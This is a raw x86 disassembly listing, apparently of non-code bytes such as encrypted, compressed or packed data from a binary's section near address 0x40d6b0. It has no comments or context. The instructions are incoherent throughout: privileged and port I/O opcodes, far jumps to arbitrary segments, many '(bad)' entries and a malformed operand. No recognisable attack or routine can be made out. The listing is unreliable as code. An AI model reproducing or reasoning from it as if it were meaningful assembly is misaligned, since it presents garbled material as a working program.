  40d6b0:	mov    ebp,0x29fc61b9
  40d6b5:	test   eax,0x886632a8
  40d6ba:	iret   
  40d6bb:	fild   WORD PTR [ebx+0x4b]
  40d6be:	sub    BYTE PTR [edx+ebx*4-0x58],bh
  40d6c2:	or     al,0x37
  40d6c4:	sar    ch,1
  40d6c6:	push   edx
  40d6c7:	jne    0x40d740
  40d6c9:	mov    dh,0xdc
  40d6cb:	jns    0x40d742
  40d6cd:	pop    ebp
  40d6ce:	neg    DWORD PTR [edx+esi*1+0x7e]
  40d6d2:	aaa    
  40d6d3:	dec    esi
  40d6d4:	pop    edx
  40d6d5:	jo     0x40d671
  40d6d7:	add    al,0xe6
  40d6d9:	jmp    0x40d675
  40d6db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d6dc:	adc    BYTE PTR ds:0x4fb300e1,al
  40d6e2:	pop    edx
  40d6e3:	stos   BYTE PTR es:[edi],al
  40d6e4:	out    dx,al
  40d6e5:	or     al,0x4c
  40d6e7:	lock add al,BYTE PTR [edx]
  40d6ea:	sub    dl,BYTE PTR [eax-0x28]
  40d6ed:	out    dx,eax
  40d6ee:	mov    ah,0xcc
  40d6f0:	pop    ebp
  40d6f1:	jns    0x40d708
  40d6f3:	fisubr WORD PTR [ebx]
  40d6f5:	push   0xffffff8e
  40d6f7:	push   0xffffffc7
  40d6f9:	mov    esi,DWORD PTR [esi+0x32]
  40d6fc:	ja     0x40d72a
  40d6fe:	loop   0x40d754
  40d700:	xor    dh,BYTE PTR [edx+0x1f]
  40d703:	jge    0x40d6fd
  40d705:	push   esi
  40d706:	in     al,0xb9
  40d708:	and    BYTE PTR [edi],bh
  40d70a:	stc    
  40d70b:	mov    al,0xdf
  40d70d:	sahf   
  40d70e:	sbb    esi,esp
  40d710:	popf   
  40d711:	jecxz  0x40d780
  40d713:	mov    eax,0xf6f4b4fe
  40d718:	add    al,ah
  40d71a:	sub    cl,BYTE PTR [esi]
  40d71c:	fist   WORD PTR [ebx+0x19]
  40d71f:	jns    0x40d713
  40d721:	hlt    
  40d722:	cmp    al,0x9c
  40d724:	aaa    
  40d725:	lds    ebp,FWORD PTR [edx+0x69]
  40d728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d729:	adc    edx,DWORD PTR [ebp+0x25]
  40d72c:	pop    ds
  40d72d:	push   edi
  40d72e:	pop    ecx
  40d72f:	jle    0x40d79b
  40d731:	popa   
  40d732:	ss nop
  40d734:	pop    esp
  40d735:	or     DWORD PTR [ebx-0x2f59c5f2],ecx
  40d73b:	push   ecx
  40d73c:	jp     0x40d6f1
  40d73e:	test   ah,dh
  40d740:	fnstenv [ecx-0x7c]
  40d743:	pop    ds
  40d744:	jno    0x40d727
  40d746:	js     0x40d7be
  40d748:	fdivr  QWORD PTR [eax+ecx*2+0x20]
  40d74c:	xchg   edx,eax
  40d74d:	push   ebx
  40d74e:	xor    al,0xca
  40d750:	jne    0x40d6d4
  40d752:	jb     0x40d71e
  40d754:	pop    ebx
  40d755:	xchg   BYTE PTR [esi-0x24],ch
  40d758:	dec    edi
  40d759:	push   edi
  40d75a:	sub    DWORD PTR [edx-0x2f],0xfffffff9
  40d75e:	or     BYTE PTR [ebx+0x4d66b66c],dh
  40d764:	sahf   
  40d765:	shr    ebp,1
  40d767:	jb     0x40d775
  40d769:	mov    DWORD PTR [edi],ebp
  40d76b:	push   edi
  40d76c:	lods   al,BYTE PTR ds:[esi]
  40d76d:	xor    DWORD PTR [ecx],ebx
  40d76f:	ret    0xe5d1
  40d772:	test   DWORD PTR [eax],esp
  40d774:	sub    eax,0x64c9cc49
  40d779:	test   al,0x9f
  40d77b:	sbb    DWORD PTR ss:[edi+0x500a6497],edx
  40d782:	cmp    bh,cl
  40d784:	cwde   
  40d785:	add    al,0x1d
  40d787:	into   
  40d788:	jo     0x40d7d9
  40d78a:	mov    al,0x83
  40d78c:	push   esp
  40d78d:	push   es
  40d78e:	or     ebp,DWORD PTR [ebx]
  40d790:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d791:	inc    ecx
  40d792:	xchg   esp,eax
  40d793:	in     eax,dx
  40d794:	sub    BYTE PTR [ebx+0x33de21e8],dh
  40d79a:	in     eax,0xaf
  40d79c:	or     eax,0xb606ca94
  40d7a1:	je     0x40d79f
  40d7a3:	cwde   
  40d7a4:	dec    esi
  40d7a5:	cdq    
  40d7a6:	xor    DWORD PTR [esi],0x5a7df0ba
  40d7ac:	inc    edx
  40d7ad:	cmp    bh,ch
  40d7af:	pop    edi
  40d7b0:	fs or  al,0xb6
  40d7b3:	test   BYTE PTR ds:0x38a3fa96,bh
  40d7b9:	pop    esp
  40d7ba:	iret   
  40d7bb:	cld    
  40d7bc:	dec    eax
  40d7bd:	push   eax
  40d7be:	push   0x3
  40d7c0:	das    
  40d7c1:	xor    eax,0x235c1fd7
  40d7c6:	mov    dl,BYTE PTR [eax]
  40d7c8:	xor    eax,edx
  40d7ca:	nop
  40d7cb:	cli    
  40d7cc:	dec    BYTE PTR [esp+ecx*1]
  40d7cf:	mov    dl,0xe6
  40d7d1:	fisttp DWORD PTR [ebx+edx*2+0x10]
  40d7d5:	imul   ecx,DWORD PTR [esi],0x13
  40d7d8:	add    dh,BYTE PTR [edx-0x43]
  40d7db:	shl    edi,cl
  40d7dd:	hlt    
  40d7de:	setp   dh
  40d7e1:	ret    0xee0d
  40d7e4:	xchg   edx,eax
  40d7e5:	and    dl,ah
  40d7e7:	iret   
  40d7e8:	ror    DWORD PTR [edx+ebp*8],1
  40d7eb:	(bad)  
  40d7ec:	push   ecx
  40d7ed:	sub    DWORD PTR [ecx-0x35a0507f],ebp
  40d7f3:	addr16 mov dh,0x94
  40d7f6:	call   0x459d:0x84bc459d
  40d7fd:	cli    
  40d7fe:	jl     0x40d7e1
  40d800:	fistp  QWORD PTR [ebx+0x17]
  40d803:	sbb    dl,ch
  40d805:	dec    esi
  40d806:	ds xchg edx,eax
  40d808:	mov    edi,0x2ea4f333
  40d80d:	sbb    BYTE PTR [edx],bl
  40d80f:	loopne 0x40d880
  40d811:	mov    BYTE PTR [edi+0x1a9c8748],bl
  40d817:	xor    eax,0x888f65e3
  40d81c:	lods   al,BYTE PTR ds:[esi]
  40d81d:	lea    edi,[esi-0x41]
  40d820:	ret    0x7a32
  40d823:	dec    ebx
  40d824:	sbb    eax,0xfa2da474
  40d829:	jne    0x40d898
  40d82b:	push   ebp
  40d82c:	jp     0x40d7e4
  40d82e:	pop    ebx
  40d82f:	stos   DWORD PTR es:[edi],eax
  40d830:	mov    dh,0xdb
  40d832:	imul   esp,esp,0xffffffb0
  40d835:	cmc    
  40d836:	daa    
  40d837:	sub    BYTE PTR [edx+0x1b],bh
  40d83a:	das    
  40d83b:	shl    DWORD PTR [esi+0x4e],1
  40d83e:	push   ebp
  40d83f:	and    esp,0x4221894d
  40d845:	pop    esp
  40d846:	mov    bl,0x77
  40d848:	scas   al,BYTE PTR es:[edi]
  40d849:	aam    0x5f
  40d84b:	hlt    
  40d84c:	mov    ch,0x14
  40d84e:	adc    eax,0x3678ad5
  40d853:	sub    eax,0x43b66241
  40d858:	rol    dh,1
  40d85a:	iret   
  40d85b:	xchg   ebp,eax
  40d85c:	popf   
  40d85d:	test   eax,0x8ad1c6a
  40d862:	add    DWORD PTR [ecx+0x59b8a6e1],0x74bd441b
  40d86c:	sub    dh,BYTE PTR [ecx-0x4e]
  40d86f:	ja     0x40d86d
  40d871:	or     DWORD PTR [eax],ebp
  40d873:	popa   
  40d874:	repz mov eax,ds:0x340b1bd5
  40d87a:	sub    al,0xda
  40d87c:	lods   al,BYTE PTR ds:[esi]
  40d87d:	in     eax,dx
  40d87e:	fwait
  40d87f:	xor    ecx,edi
  40d881:	pop    esp
  40d882:	in     eax,0x2b
  40d884:	add    BYTE PTR [eax-0x454d7aff],0x83
  40d88b:	add    al,0x28
  40d88d:	ret    
  40d88e:	inc    ebx
  40d88f:	dec    esp
  40d890:	pop    edx
  40d891:	adc    cl,bh
  40d893:	xor    DWORD PTR ss:[ecx],eax
  40d896:	es jmp 0x40d880
  40d899:	push   es
  40d89a:	icebp  
  40d89b:	fst    DWORD PTR [edx+0x6223f046]
  40d8a1:	sbb    al,0x5c
  40d8a3:	sbb    eax,edx
  40d8a5:	imul   ecx,edx,0xdb74162f
  40d8ab:	jl     0x40d8a6
  40d8ad:	test   eax,0xfd5b0cd0
  40d8b2:	sbb    al,0xa8
  40d8b4:	cmp    DWORD PTR [ebx+edi*1+0x6bcd0c58],eax
  40d8bb:	into   
  40d8bc:	out    dx,eax
  40d8bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d8be:	in     al,0x5b
  40d8c0:	mov    al,0xc4
  40d8c2:	scas   eax,DWORD PTR es:[edi]
  40d8c3:	pop    edi
  40d8c4:	pusha  
  40d8c5:	mov    edx,0xba7da756
  40d8ca:	(bad)  
  40d8cb:	pushf  
  40d8cc:	adc    edx,ecx
  40d8ce:	dec    edx
  40d8cf:	(bad)  
  40d8d0:	mov    esp,0x484fa3a3
  40d8d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d8d6:	sti    
  40d8d7:	push   0xffffffba
  40d8d9:	iret   
  40d8da:	(bad)  
  40d8db:	std    
  40d8dc:	ins    DWORD PTR es:[edi],dx
  40d8dd:	xor    esp,DWORD PTR [ebx-0x28b5bb3b]
  40d8e3:	loope  0x40d8fc
  40d8e5:	and    edx,ebx
  40d8e7:	add    BYTE PTR [ebx-0x2bd3797c],0xe8
  40d8ee:	mov    cl,0xc2
  40d8f0:	adc    dl,BYTE PTR [ebp+0x5b]
  40d8f3:	sar    DWORD PTR [edi+0x11ae11],cl
  40d8f9:	and    eax,0x54164f4a
  40d8fe:	xchg   BYTE PTR [ebx+0x7b2185ce],dl
  40d904:	jge    0x40d96e
  40d906:	xor    esp,DWORD PTR [ebp-0x41]
  40d909:	cmp    ah,BYTE PTR [esi+0x42]
  40d90c:	xor    esi,esi
  40d90e:	mov    ah,0xf6
  40d910:	mov    DWORD PTR [ebx],ebp
  40d912:	mov    WORD PTR [eax-0x293f34c6],gs
  40d918:	and    BYTE PTR [edx-0x62b7dbb0],ch
  40d91e:	lods   eax,DWORD PTR ds:[esi]
  40d91f:	mov    esp,0x1fd309ba
  40d924:	inc    edi
  40d925:	fdiv   DWORD PTR [ecx]
  40d927:	out    0xaf,al
  40d929:	outs   dx,BYTE PTR ds:[esi]
  40d92a:	push   esp
  40d92b:	lock inc ecx
  40d92d:	loopne 0x40d8e9
  40d92f:	jmp    0x2b33013c
  40d934:	popa   
  40d935:	sub    al,0xf4
  40d937:	pop    ecx
  40d938:	pop    ecx
  40d939:	xchg   DWORD PTR [edx+0xb],ebp
  40d93c:	and    DWORD PTR [ebx+0x53e4a9ab],0x8c843c73
  40d946:	js     0x40d8e2
  40d948:	mov    ds,WORD PTR [edi+0x6315082e]
  40d94e:	adc    DWORD PTR [esi],eax
  40d950:	inc    esi
  40d951:	adc    bh,BYTE PTR [edx+esi*2+0x11808468]
  40d958:	aaa    
  40d959:	(bad)  
  40d95a:	test   BYTE PTR [esi+0x11b87ca5],ch
  40d960:	sbb    ecx,esp
  40d962:	xchg   ebx,eax
  40d963:	push   ds
  40d964:	push   ebp
  40d965:	out    dx,eax
  40d966:	inc    esi
  40d967:	loop   0x40d92d
  40d969:	xchg   ebp,eax
  40d96a:	nop
  40d96b:	push   esi
  40d96c:	adc    BYTE PTR ds:0x2c90719f,0x81
  40d973:	mov    dl,0x85
  40d975:	cmp    al,0x4
  40d977:	out    dx,al
  40d978:	mov    dh,0x40
  40d97a:	gs je  0x40d97e
  40d97d:	call   0xb81e:0x7fe5156
  40d984:	mov    eax,ds:0xbbf122c6
  40d989:	cmp    eax,DWORD PTR [ebx-0x6c]
  40d98c:	xchg   esi,eax
  40d98d:	gs and ah,bl
  40d990:	popf   
  40d991:	aas    
  40d992:	mov    al,ds:0xf122c503
  40d997:	jne    0x40da17
  40d999:	xchg   BYTE PTR [ebx+0x29],dh
  40d99c:	mov    esp,DWORD PTR [edi+0x5d]
  40d99f:	lahf   
  40d9a0:	dec    ebx
  40d9a1:	sti    
  40d9a2:	xchg   DWORD PTR [esi+0x722e71bc],esi
  40d9a8:	mov    ds:0xe7c93c7a,al
  40d9ad:	xlat   BYTE PTR ds:[ebx]
  40d9ae:	nop
  40d9af:	xor    ebp,DWORD PTR [esi-0x77f6a23d]
  40d9b5:	jno    0x40d9cd
  40d9b7:	cmp    al,0xc4
  40d9b9:	stos   DWORD PTR es:[edi],eax
  40d9ba:	pop    es
  40d9bb:	ds repz mov ah,0xd2
  40d9bf:	popf   
  40d9c0:	aas    
  40d9c1:	data16 fwait
  40d9c3:	les    ebp,FWORD PTR [esi+0x73b2fee8]
  40d9c9:	or     al,0xd1
  40d9cb:	inc    edx
  40d9cc:	les    esp,FWORD PTR [ebx+0x1472a1f0]
  40d9d2:	shl    BYTE PTR [ebx-0x38],0xc5
  40d9d6:	push   edx
  40d9d7:	add    eax,0x2a2e6629
  40d9dc:	ja     0x40da17
  40d9de:	cmp    DWORD PTR [ebp-0x79],edi
  40d9e1:	or     al,0x58
  40d9e3:	jge    0x40d96b
  40d9e5:	stos   DWORD PTR es:[edi],eax
  40d9e6:	push   es
  40d9e7:	push   ebp
  40d9e8:	test   eax,0x75fe1dde
  40d9ed:	cmp    esp,ebp
  40d9ef:	daa    
  40d9f0:	add    BYTE PTR [eax-0xc],dh
  40d9f3:	mov    eax,ds:0x69a21f1c
  40d9f8:	sub    eax,0xf7c8aa5
  40d9fd:	lods   al,BYTE PTR ds:[esi]
  40d9fe:	js     0x40da55
  40da00:	xor    DWORD PTR [ebx+0x2f99644c],ebx
  40da06:	jo     0x40da65
  40da08:	cmp    ah,BYTE PTR [edi-0x10]
  40da0b:	push   esp
  40da0c:	out    0x45,eax
  40da0e:	xchg   esi,eax
  40da0f:	ror    DWORD PTR [eax],cl
  40da11:	pop    esi
  40da12:	sbb    eax,0x426f168
  40da17:	adc    dh,BYTE PTR [ebx-0x49]
  40da1a:	(bad)  
  40da1b:	mov    fs,ecx
  40da1d:	dec    ebx
  40da1e:	sahf   
  40da1f:	(bad)  
  40da20:	int    0x47
  40da22:	sub    edx,DWORD PTR [esi-0x19]
  40da25:	push   0x61
  40da27:	sbb    BYTE PTR [ecx+ebp*2+0x9],ch
  40da2b:	sbb    al,0x14
  40da2d:	sub    BYTE PTR [esi-0x47],0x59
  40da31:	jb     0x40daa5
  40da33:	retf   
  40da34:	fcom   QWORD PTR [ebp-0x24]
  40da37:	nop
  40da38:	aad    0x67
  40da3a:	popf   
  40da3b:	out    dx,eax
  40da3c:	pop    esp
  40da3d:	lea    ebp,[ebx+edx*8-0x7d]
  40da41:	div    ebx
  40da43:	cld    
  40da44:	out    dx,eax
  40da45:	xor    BYTE PTR [ebx+eiz*4],bh
  40da48:	xchg   ecx,eax
  40da49:	dec    ecx
  40da4a:	aaa    
  40da4b:	lods   al,BYTE PTR ds:[esi]
  40da4c:	inc    eax
  40da4d:	icebp  
  40da4e:	xchg   BYTE PTR es:0x6a32fc2b,cl
  40da55:	lahf   
  40da56:	(bad)  
  40da57:	clc    
  40da58:	inc    ebx
  40da59:	lods   al,BYTE PTR ds:[esi]
  40da5a:	xchg   edx,eax
  40da5b:	call   0x10a68cb5
  40da60:	test   eax,0x2fa63a9
  40da65:	sbb    eax,0xc2f18ba1
  40da6a:	pop    ebp
  40da6b:	aaa    
  40da6c:	ja     0x40da16
  40da6e:	add    al,bl
  40da70:	xchg   edx,eax
  40da71:	dec    ecx
  40da72:	arpl   WORD PTR [ecx],bp
  40da74:	add    eax,eax
  40da76:	and    esi,ebp
  40da78:	cwde   
  40da79:	sar    BYTE PTR [edx],cl
  40da7b:	aad    0xa7
  40da7d:	fadd   QWORD PTR [ecx]
  40da7f:	pop    edi
  40da80:	jnp    0x40da06
  40da82:	cmp    al,0x7c
  40da84:	call   0x63d1e881
  40da89:	mov    ds:0xee50b38a,eax
  40da8e:	mov    ds:0x78aa4040,al
  40da93:	pop    ds
  40da94:	sub    eax,0xfd38b211
  40da99:	add    eax,0xca83716a
  40da9e:	setne  BYTE PTR [edi]
  40daa1:	jae    0x40da86
  40daa3:	push   ss
  40daa4:	xor    al,0x7e
  40daa6:	fsubr  QWORD PTR [eax]
  40daa8:	sbb    esp,ebp
  40daaa:	les    esp,FWORD PTR [edx-0xa2cbda4]
  40dab0:	ret    
  40dab1:	int3   
  40dab2:	bnd jns 0x40da76
  40dab5:	push   ebx
  40dab6:	xor    DWORD PTR ds:0x4bf0cc16,esp
  40dabc:	ja     0x40daaa
  40dabe:	adc    ah,BYTE PTR [ecx+0x43]
  40dac1:	xchg   ebx,eax
  40dac2:	(bad)  
  40dac3:	shr    DWORD PTR [ebx+ebx*2],0xee
  40dac7:	lock cli 
  40dac9:	mov    eax,ds:0x2650e98e
  40dace:	jmp    0x2596:0xef179e35
  40dad5:	cmc    
  40dad6:	(bad)  
  40dad7:	push   cs
  40dad8:	aad    0xb8
  40dada:	(bad)  
  40dadb:	sbb    cl,BYTE PTR [edi-0x5d36de7f]
  40dae1:	push   ecx
  40dae2:	cs push es
  40dae4:	fld    QWORD PTR [esi-0x2a6ca9af]
  40daea:	jmp    0xabf4:0x4bdbd9ad
  40daf1:	sub    eax,0x60050d3
  40daf6:	cdq    
  40daf7:	daa    
  40daf8:	jns    0x40dab7
  40dafa:	fs sahf 
  40dafc:	dec    edx
  40dafd:	or     esi,DWORD PTR [ebx+0x64]
  40db00:	mov    ebp,0x6cec370
  40db05:	push   ebx
  40db06:	dec    edi
  40db07:	iret   
  40db08:	dec    ebx
  40db09:	xor    eax,0x2ce2b4e5
  40db0e:	cld    
  40db0f:	mov    esp,ecx
  40db11:	add    bl,bh
  40db13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40db14:	adc    BYTE PTR [esi],al
  40db16:	jl     0x40db3f
  40db18:	mov    DWORD PTR [ebx],edx
  40db1a:	inc    ebx
  40db1b:	mov    dl,0x97
  40db1d:	xor    al,dh
  40db1f:	divps  xmm3,XMMWORD PTR [esi]
  40db22:	js     0x40db52
  40db24:	mov    WORD PTR [esi-0x2c],cs
  40db27:	mov    al,0xf1
  40db29:	and    DWORD PTR [esi+eiz*1+0x2c6616e7],0x62
  40db31:	mov    esp,0xc3fcc0ee
  40db36:	inc    ebp
  40db37:	mov    eax,0x4b4527b5
  40db3c:	arpl   WORD PTR ds:0x1d7f4b47,bp
  40db42:	ret    0xd68
  40db45:	cmp    esi,DWORD PTR [edx-0x5e892588]
  40db4b:	mov    al,ds:0xd14b56e9
  40db50:	rcr    bl,cl
  40db52:	add    esp,edx
  40db54:	leave  
  40db55:	neg    BYTE PTR [edi]
  40db57:	fist   WORD PTR [ebp-0x790e9055]
  40db5d:	inc    ebx
  40db5e:	xchg   edi,eax
  40db5f:	jbe    0x40daf5
  40db61:	stos   DWORD PTR es:[edi],eax
  40db62:	stos   BYTE PTR es:[edi],al
  40db63:	addr16 dec ebp
  40db65:	jbe    0x40db04
  40db67:	adc    eax,0x449ed3c7
  40db6c:	jns    0x40db1d
  40db6e:	jp     0x40db15
  40db70:	xlat   BYTE PTR ds:[ebx]
  40db71:	sbb    cl,al
  40db73:	push   esp
  40db74:	add    esp,DWORD PTR [esi-0x46]
  40db77:	ret    0x4051
  40db7a:	adc    ah,BYTE PTR [edi+esi*4-0x593aa068]
  40db81:	adc    bh,bh
  40db83:	mov    edi,0x90796266
  40db88:	stc    
  40db89:	push   es
  40db8a:	call   0xf6930c99
  40db8f:	fdiv   QWORD PTR [edi]
  40db91:	bound  ecx,QWORD PTR [edi]
  40db93:	jnp    0x40dbde
  40db95:	ds ja  0x40db9b
  40db98:	jne    0x40db61
  40db9a:	test   al,0x9a
  40db9c:	push   eax
  40db9d:	push   cs
  40db9e:	test   eax,0xe5439efd
  40dba3:	inc    ebx
  40dba4:	pop    edx
  40dba5:	(bad)  
  40dba6:	sub    eax,0xd98e5b25
  40dbab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dbac:	mov    esi,0xe5b58155
  40dbb1:	cmp    al,0xa1
  40dbb3:	xchg   DWORD PTR [ebx+0x15fa2d94],ebp
  40dbb9:	aam    0x6d
  40dbbb:	into   
  40dbbc:	add    al,0x18
  40dbbe:	mov    eax,ecx
  40dbc0:	add    eax,DWORD PTR [ecx-0x1bb6ab34]
  40dbc6:	sbb    edi,edi
  40dbc8:	in     eax,0x99
  40dbca:	ins    DWORD PTR es:[edi],dx
  40dbcb:	stos   BYTE PTR es:[edi],al
  40dbcc:	or     ecx,edi
  40dbce:	outs   dx,DWORD PTR ds:[esi]
  40dbcf:	add    esi,DWORD PTR [ecx-0x61]
  40dbd2:	test   DWORD PTR [ebx-0x66170615],edi
  40dbd8:	in     eax,0xc1
  40dbda:	icebp  
  40dbdb:	push   ss
  40dbdc:	adc    al,0xc5
  40dbde:	lods   al,BYTE PTR ds:[esi]
  40dbdf:	xor    DWORD PTR [esp+eiz*2],ebp
  40dbe2:	imul   ebp,DWORD PTR [esi+0x25],0x75
  40dbe6:	mov    edi,0x53f06054
  40dbec:	je     0x40dbc2
  40dbee:	fucomp st(1)
  40dbf0:	sub    DWORD PTR [edi-0x78e20a46],0x1b149e88
  40dbfa:	cmc    
  40dbfb:	mov    dl,0xb4
  40dbfd:	call   0x646ef2e5
  40dc02:	jne    0x40dc03
  40dc04:	aas    
  40dc05:	add    BYTE PTR ds:0x36a4af9b,al
  40dc0b:	jecxz  0x40dbc6
  40dc0d:	jnp    0x40dbfd
  40dc0f:	les    edx,FWORD PTR [ebx-0xbdce7d7]
  40dc15:	or     al,0xb8
  40dc17:	jns    0x40db9a
  40dc19:	imul   edi,DWORD PTR [ebx],0xfffffffd
  40dc1c:	rcr    ecx,cl
  40dc1e:	inc    eax
  40dc1f:	das    
  40dc20:	or     ebx,DWORD PTR [ecx+ecx*2-0x18]
  40dc24:	pop    esp
  40dc25:	or     eax,0x75a9edb9
  40dc2a:	sub    al,0x39
  40dc2c:	and    eax,0x4d672b50
  40dc31:	scas   eax,DWORD PTR es:[edi]
  40dc32:	ret    0xf40c
  40dc35:	ss pop edx
  40dc37:	out    dx,al
  40dc38:	retf   0xa356
  40dc3b:	popf   
  40dc3c:	inc    esp
  40dc3e:	popa   
  40dc3f:	push   eax
  40dc40:	(bad)  
  40dc42:	pop    edi
  40dc43:	xor    edx,DWORD PTR [ecx+0x7d]
  40dc46:	mov    DWORD PTR [edx-0xdb068b],edx
  40dc4c:	mov    bl,0x27
  40dc4e:	lds    eax,FWORD PTR [edx+0x12a0a32a]
  40dc54:	or     edx,ebx
  40dc56:	or     ebx,esi
  40dc58:	dec    ebp
  40dc59:	ffreep st(3)
  40dc5b:	push   ds
  40dc5c:	and    al,0xcf
  40dc5e:	lahf   
  40dc5f:	xchg   edi,eax
  40dc60:	ret    0xf0d1
  40dc63:	and    al,0x99
  40dc65:	mov    bl,BYTE PTR [edx+ebp*1]
  40dc68:	out    0xbd,eax
  40dc6a:	mov    ds:0x70a59f9c,al
  40dc6f:	cmp    BYTE PTR ds:0x5049aac9,0xe3
  40dc76:	or     esp,DWORD PTR [edi]
  40dc78:	verr   WORD PTR [ebp+edx*1-0x4e]
  40dc7d:	pop    ebp
  40dc7e:	add    eax,0xc7e721a6
  40dc83:	shr    BYTE PTR [edi+ebp*1+0x30],cl
  40dc87:	cmp    al,0x14
  40dc89:	clc    
  40dc8a:	xchg   BYTE PTR [eax],dl
  40dc8c:	out    dx,eax
  40dc8d:	dec    ebx
  40dc8e:	mov    ?,WORD PTR [esi-0xafe2882]
  40dc94:	sbb    bh,BYTE PTR [edx-0x35]
  40dc97:	pop    ds
  40dc98:	sbb    DWORD PTR [ebp+esi*4-0x80],0x8e7c7f40
  40dca0:	mov    al,ds:0x7f4a5e94
  40dca5:	pop    ds
  40dca6:	cmp    esp,DWORD PTR [ebp-0x5a]
  40dca9:	and    DWORD PTR ds:0x675c6d80,0x38135078
  40dcb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcb4:	sbb    dl,BYTE PTR [eax-0x34]
  40dcb7:	mov    bh,0xf6
  40dcb9:	pop    esp
  40dcba:	enter  0x6843,0xd2
  40dcbe:	cmp    al,0xcd
  40dcc0:	test   eax,0xaa9e5ea3
  40dcc5:	push   ss
  40dcc6:	out    dx,eax
  40dcc7:	or     ah,BYTE PTR [esp+edx*2]
  40dcca:	in     al,0x66
  40dccc:	pop    ecx
  40dccd:	ins    BYTE PTR es:[edi],dx
  40dcce:	sub    BYTE PTR [edi+edi*1-0x14f790e9],bh
  40dcd5:	je     0x40dc9d
  40dcd7:	inc    edx
  40dcd8:	lds    esi,FWORD PTR [edi-0x1562ec4]
  40dcde:	cmp    DWORD PTR [esi],edi
  40dce0:	mov    esi,edx
  40dce2:	dec    ebp
  40dce3:	fst    DWORD PTR [eax]
  40dce5:	stc    
  40dce6:	fst    QWORD PTR [esi-0xcb31d65]
  40dcec:	xchg   ebp,eax
  40dced:	jnp    0x40dcf6
  40dcef:	into   
  40dcf0:	call   0xbac4:0xdc324aab
  40dcf7:	mov    esp,0xbffc97a0
  40dcfc:	out    dx,al
  40dcfd:	aas    
  40dcfe:	sub    BYTE PTR [esi],0x35
  40dd01:	rcl    bh,0x5
  40dd04:	add    DWORD PTR [ebp+0x39],edx
  40dd07:	mov    edx,0x317215e3
  40dd0c:	retf   0xf156
  40dd0f:	sbb    esp,edx
  40dd11:	retf   0x7e3c
  40dd14:	in     eax,0x85
  40dd16:	std    
  40dd17:	jmp    0xb861:0xd5218d37
  40dd1e:	mov    WORD PTR [ebx-0x20],fs
  40dd21:	int    0x37
  40dd23:	xor    DWORD PTR [esi],0x65
  40dd26:	inc    al
  40dd28:	ficomp WORD PTR [eax-0x4e]
  40dd2b:	xor    DWORD PTR [ebx+esi*8],esp
  40dd2e:	int    0x31
  40dd30:	mov    ds:0xf653fd70,eax
  40dd35:	sub    BYTE PTR [ecx+0xd5c1a82],cl
  40dd3b:	fiadd  WORD PTR [edi]
  40dd3d:	mov    ah,0xb6
  40dd3f:	jbe    0x40dcf1
  40dd41:	call   DWORD PTR [ecx-0x5dce2c90]
  40dd47:	fldcw  WORD PTR [ecx*8+0x71849169]
  40dd4e:	add    esp,ebp
  40dd50:	adc    BYTE PTR [ecx+0x3e],bh
  40dd53:	call   0x53974db8
  40dd58:	call   DWORD PTR [edi-0x34ee37ee]
  40dd5e:	test   DWORD PTR [esi-0x70c1851a],edi
  40dd64:	push   es
  40dd65:	jne    0x40dddf
  40dd67:	pop    ss
  40dd68:	js     0x40dd3d
  40dd6a:	jg     0x40dd50
  40dd6c:	sbb    eax,0x660e8d80
  40dd71:	(bad)  
  40dd72:	jmp    0x40dcfd
  40dd74:	mov    ecx,0x6441613e
  40dd79:	mov    ebp,0x56d57fc6
  40dd7e:	and    DWORD PTR [edx-0x5a],edx
  40dd81:	add    BYTE PTR [edi-0x4ef4570],dh
  40dd87:	inc    edx
  40dd88:	lahf   
  40dd89:	fbld   TBYTE PTR [eax+0x51f4b888]
  40dd8f:	jmp    0x7a9b:0xaa2b7c7c
  40dd96:	xor    dl,BYTE PTR [edx+0x4e]
  40dd99:	sbb    ebx,esi
  40dd9b:	retf   
  40dd9c:	adc    eax,0x62c3a18c
  40dda1:	lods   eax,DWORD PTR ds:[esi]
  40dda2:	inc    eax
  40dda3:	sar    DWORD PTR [esi-0x6f],0x88
  40dda7:	fcomp  DWORD PTR [edx-0x4a273a58]
  40ddad:	nop
  40ddae:	popa   
  40ddaf:	mov    dl,0xaa
  40ddb1:	mov    ds:0x6b94f8f5,eax
  40ddb6:	xchg   esp,eax
  40ddb7:	and    ecx,DWORD PTR [edi-0x11]
  40ddba:	cmp    eax,0x37a366c6
  40ddbf:	addr16 mov ebx,0x3a9261be
  40ddc5:	mov    bl,0xa
  40ddc7:	shl    DWORD PTR [esp+edx*2-0x2c],1
  40ddcb:	in     al,0xf7
  40ddcd:	in     eax,0x56
  40ddcf:	inc    ebp
  40ddd0:	aaa    
  40ddd1:	jmp    0x40ddb5
  40ddd3:	add    DWORD PTR [ebx+edi*4-0x65],eax
  40ddd7:	push   esp
  40ddd8:	push   ds
  40ddd9:	cli    
  40ddda:	xor    al,0x55
  40dddc:	pop    eax
  40dddd:	sub    bl,0x10
  40dde0:	adc    esi,ecx
  40dde2:	(bad)  [edi]
  40dde4:	mov    esp,0xd2b2a835
  40dde9:	xchg   ebx,eax
  40ddea:	cmp    al,0x97
  40ddec:	das    
  40dded:	sub    eax,0x8029abad
  40ddf2:	mov    ah,0xc6
  40ddf4:	mov    ebx,DWORD PTR [edx+0x4b]
  40ddf7:	mov    ah,0x6d
  40ddf9:	call   DWORD PTR [eax+0x466d0151]
  40ddff:	mov    dh,0x78
  40de01:	in     al,0x93
  40de03:	loopne 0x40dd8e
  40de05:	add    DWORD PTR [ebp-0x6d59986d],0xffffffaa
  40de0c:	xchg   BYTE PTR [ebp-0x19492e32],ch
  40de12:	sub    DWORD PTR [ebp+0x4e16ded],0x836c83f4
  40de1c:	jb     0x40de5f
  40de1e:	sbb    ah,BYTE PTR [edx+0x3d079331]
  40de24:	out    dx,eax
  40de25:	repz mov dh,0x84
  40de28:	in     al,dx
  40de29:	add    dl,ch
  40de2b:	dec    ebx
  40de2c:	sbb    ebx,DWORD PTR ds:0x2fb5f763
  40de32:	ins    BYTE PTR es:[edi],dx
  40de33:	push   edi
  40de34:	adc    cl,BYTE PTR [edx-0x6ae44531]
  40de3a:	push   eax
  40de3b:	mov    esi,0x9a609463
